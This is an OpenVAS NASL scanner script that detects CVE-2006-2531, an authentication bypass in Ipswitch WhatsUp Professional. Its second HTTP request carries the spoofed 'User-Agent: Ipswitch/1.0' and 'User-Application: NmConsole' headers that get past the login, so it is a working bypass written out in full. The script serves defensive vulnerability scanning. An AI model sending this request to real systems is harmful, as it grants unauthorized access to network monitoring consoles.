# OpenVAS Vulnerability Test
# $Id: ipswitch_whatsup_auth_bypass.nasl 9349 2018-04-06 07:02:25Z cfischer $
# Description: Ipswitch WhatsUp Professional Authentication bypass detection
#
# Authors:
# David Maciejak <david dot maciejak at kyxar dot fr>
#
# Copyright:
# Copyright (C) 2006 David Maciejak
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "The remote web server is affected by an authentication bypass flaw. 

Description :

The remote host is running Ipswitch WhatsUp Professional, which is
used to monitor states of applications, services and hosts. 

The version of WhatsUp Professional installed on the remote host
allows an attacker to bypass authentication with a specially-crafted
request.";

tag_solution = "Upgrade to WhatsUp Professional 2006.01 or later.";

if(description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.80067");
 script_version("$Revision: 9349 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:02:25 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2008-10-24 23:33:44 +0200 (Fri, 24 Oct 2008)");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_cve_id("CVE-2006-2531");
 script_bugtraq_id(18019);
 script_name("Ipswitch WhatsUp Professional Authentication bypass detection");
 script_category(ACT_GATHER_INFO);
 script_tag(name:"qod_type", value:"remote_vul");
 script_copyright("This script is Copyright (C) 2006 David Maciejak");
 script_family("Web application abuses");
 script_dependencies("gb_get_http_banner.nasl");
 script_require_ports("Services/www", 8022);
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 script_xref(name : "URL" , value : "http://www.ftusecurity.com/pub/whatsup.public.pdf");
 script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/434247/30/0/threaded");
 script_xref(name : "URL" , value : "http://www.ipswitch.com/support/whatsup_professional/releases/wup200601.asp");
 script_mandatory_keys("Ipswitch/banner");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:8022);
banner = get_http_banner(port:port);
if ("Server: Ipswitch" >!< banner) exit(0);


# Send a request and make sure we're required to login.
host = http_host_name( port:port );
req = string(
  'GET /NmConsole/Default.asp?bIsJavaScriptDisabled=false HTTP/1.1\r\n',
  'Host: ', host, '\r\n',
  'User-Agent: ', OPENVAS_HTTP_USER_AGENT, '\r\n',
  'Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*.*;q=0.5\r\n',
  'Accept-Language: en-us,en;q=0.5\r\n',
  'Accept-Encoding: gzip,deflate\r\n',
  'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n',
  'Referer: http://', host, '/\r\n',
  '\r\n'
);
res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
if(res == NULL)exit(0);


# If so...
if ("Location: /NmConsole/Login.asp" >< res)
{
  req = string(
    'GET /NmConsole/Default.asp?bIsJavaScriptDisabled=false HTTP/1.1\r\n',
    'Host: ', host, '\r\n',
    'User-Agent: Ipswitch/1.0\r\n',
    'User-Application: NmConsole\r\n',
    'Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*.*;q=0.5\r\n',
    'Accept-Language: en-us,en;q=0.5\r\n',
    'Accept-Encoding: gzip,deflate\r\n',
    'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n',
    'Referer: http://', host, '/\r\n',
    '\r\n'
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if(res == NULL)exit(0);

  # There's a problem if we're now authenticated.
  if ("<title>Group Device List for" >< res) security_message(port);
}
